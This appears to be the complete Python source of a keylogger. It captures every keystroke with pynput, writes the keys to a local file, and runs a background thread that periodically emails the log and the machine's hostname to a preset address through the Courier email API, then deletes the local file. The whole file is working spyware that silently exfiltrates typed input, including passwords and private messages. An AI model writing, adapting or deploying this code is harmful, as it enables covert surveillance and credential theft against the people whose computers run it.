
from pynput.keyboard import Key
from pynput.keyboard import Listener
from time import sleep
from trycourier import Courier
import os
import threading
from utils.utils import *
from utils.const import *

file_lock = threading.Lock()


def sentMail():
    while True:
        print(get_current_function_name())
        sleep(TIME_DELAY_TO_SENT)

        with file_lock:
            with open(OUTPUT_FILE_NAME, 'r') as file:
                data = file.read().replace('\n', '')

                if len(data) != 0:
                    time_sent = f"Time sent = {get_current_time()}"
                    print(time_sent)
                    client = Courier(auth_token=API_KEY)

                    try:
                        response_email = client.send_message(
                            message={
                                "to": {
                                    "email": TO_EMAIL
                                },
                                "content": {
                                    "title": f"TITLE_EMAIL - [{time_sent}]",
                                    "body": "KEYLOGGER: {{keylogger}}"
                                },
                                "data": {
                                    "keylogger": get_hostname() + KEY_DOUBLE_DOT + data
                                },
                            }
                        )
                        os.remove(OUTPUT_FILE_NAME)
                    except Exception as e:
                        print("Error sending email:", str(e))


def loggerr():
    print(get_current_function_name())

    # TODO: remove array when sent mail done
    the_keys = [FIRST_ELEMENT]

    def on_press(original_key):
        # print(original_key)
        if str(original_key).startswith("Key."):
            try:
                modified_key = f"[{str(original_key).replace('Key.', '')}]"
                if the_keys[-1] != modified_key:
                    # print(modified_key)
                    the_keys.append(modified_key)
                    storeKeysToFile(the_keys)
                return
            except Exception as e:
                print(f"An error occurred: {e}")
                return

        key_value = original_key
        if hasattr(original_key, 'vk') and original_key.vk in numpad_mapping:
            key_value = numpad_mapping[original_key.vk]
            # print('You entered a number from the numpad:', key_value)
            the_keys.append(key_value)
        else:
            the_keys.append(key_value)
        storeKeysToFile(the_keys)

    def storeKeysToFile(keys):
        with file_lock:
            with open(OUTPUT_FILE_NAME, 'w') as log:
                for the_key in keys:
                    the_key = fixQuoteAndDoubleQuote(the_key)
                    log.write(the_key)

    def on_release(the_key):
        # if the_key == Key.esc:
        #     return False
        return True

    with Listener(
        on_press=on_press,
        on_release=on_release
    ) as the_listener:
        the_listener.join()


t1 = threading.Thread(target=sentMail, args=[])
t2 = threading.Thread(target=loggerr, args=[])
t1.start()
t2.start()
